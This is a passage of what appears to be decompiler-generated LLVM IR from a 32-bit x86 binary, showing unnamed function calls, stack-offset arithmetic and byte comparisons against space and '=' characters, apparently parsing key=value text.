  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8052690()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_80526e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge7 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge7, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8052690()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_80554a9.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8052690()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp144, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_80554a9.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8052690()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp145, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
